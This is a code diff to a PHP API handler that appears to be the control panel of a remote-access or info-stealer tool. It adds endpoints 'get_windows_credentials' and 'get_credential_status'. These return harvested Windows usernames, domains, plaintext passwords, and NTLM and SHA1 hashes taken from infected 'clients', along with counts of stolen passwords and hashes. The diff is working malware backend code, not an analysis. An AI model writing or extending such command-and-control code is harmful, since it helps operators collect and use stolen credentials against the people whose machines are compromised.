@@ -15,9 +15,12 @@ function handleAPIRequests($pdo, $logged_in)
         'get_rdp_logs',
         'get_installed_programs',
         'get_uploaded_files',
+        'get_windows_credentials', // جدید
+        'get_credential_status',   // جدید
         'download_log',
         'download_user_data'
     ];
+
 
     $isApiRequest = false;
     $requestedEndpoint = null;
@@ -107,6 +110,117 @@ function handleAPIRequests($pdo, $logged_in)
                 return cleanUtf8($data);
         }
     }
+
+    // ===== GET WINDOWS CREDENTIALS =====
+    if (isset($_GET['get_windows_credentials'])) {
+        header('Content-Type: application/json; charset=utf-8');
+        if (ob_get_length()) ob_clean();
+
+        try {
+            $client_id = $_GET['client_id'] ?? 'all';
+            $limit = min($_GET['limit'] ?? 100, 500);
+            $offset = $_GET['offset'] ?? 0;
+
+            logInfo("Fetching windows credentials", ['client_id' => $client_id, 'limit' => $limit, 'offset' => $offset]);
+
+            if ($client_id === 'all') {
+                $stmt = $pdo->prepare("
+                SELECT id, client_id, username, domain, password, ntlm_hash, sha1_hash, 
+                       credential_type, source, extracted_at, created_at
+                FROM client_windows_credentials 
+                ORDER BY created_at DESC 
+                LIMIT ? OFFSET ?
+            ");
+                $stmt->execute([$limit, $offset]);
+            } else {
+                $stmt = $pdo->prepare("
+                SELECT id, client_id, username, domain, password, ntlm_hash, sha1_hash, 
+                       credential_type, source, extracted_at, created_at
+                FROM client_windows_credentials 
+                WHERE client_id = ?
+                ORDER BY created_at DESC 
+                LIMIT ? OFFSET ?
+            ");
+                $stmt->execute([$client_id, $limit, $offset]);
+            }
+
+            $credentials = $stmt->fetchAll();
+
+            // دریافت آمار
+            $statsStmt = $pdo->prepare("
+            SELECT COUNT(*) as total_credentials,
+                   COUNT(DISTINCT client_id) as unique_clients,
+                   SUM(CASE WHEN password IS NOT NULL AND password != '' THEN 1 ELSE 0 END) as passwords_count,
+                   SUM(CASE WHEN ntlm_hash IS NOT NULL AND ntlm_hash != '' THEN 1 ELSE 0 END) as hashes_count
+            FROM client_windows_credentials
+        ");
+            $statsStmt->execute();
+            $stats = $statsStmt->fetch();
+
+            logInfo("Fetched windows credentials", ['count' => count($credentials), 'stats' => $stats]);
+
+            $response = [
+                'windows_credentials' => cleanArray($credentials),
+                'stats' => $stats,
+                'pagination' => [
+                    'limit' => $limit,
+                    'offset' => $offset,
+                    'total' => $stats['total_credentials']
+                ]
+            ];
+
+            echo json_encode($response, JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE);
+        } catch (Exception $e) {
+            logError("get_windows_credentials failed", $e->getMessage());
+            sendJsonError('Failed to fetch windows credentials: ' . $e->getMessage());
+        }
+        exit;
+    }
+
+    // ===== GET CREDENTIAL STATUS =====
+    if (isset($_GET['get_credential_status'])) {
+        header('Content-Type: application/json; charset=utf-8');
+        if (ob_get_length()) ob_clean();
+
+        try {
+            $client_id = $_GET['client_id'] ?? 'all';
+            $limit = min($_GET['limit'] ?? 50, 200);
+
+            logInfo("Fetching credential status", ['client_id' => $client_id]);
+
+            if ($client_id === 'all') {
+                $stmt = $pdo->prepare("
+                SELECT id, client_id, status, credentials_found, hashes_found, passwords_found, 
+                       message, created_at
+                FROM client_credential_status 
+                ORDER BY created_at DESC 
+                LIMIT ?
+            ");
+                $stmt->execute([$limit]);
+            } else {
+                $stmt = $pdo->prepare("
+                SELECT id, client_id, status, credentials_found, hashes_found, passwords_found, 
+                       message, created_at
+                FROM client_credential_status 
+                WHERE client_id = ?
+                ORDER BY created_at DESC 
+                LIMIT ?
+            ");
+                $stmt->execute([$client_id, $limit]);
+            }
+
+            $status_logs = $stmt->fetchAll();
+
+            logInfo("Fetched credential status", ['count' => count($status_logs)]);
+
+            echo json_encode(['credential_status' => cleanArray($status_logs)], JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE);
+        } catch (Exception $e) {
+            logError("get_credential_status failed", $e->getMessage());
+            sendJsonError('Failed to fetch credential status: ' . $e->getMessage());
+        }
+        exit;
+    }
+
 
     // ===== GET LOGS =====
     if (isset($_GET['get_logs'])) {
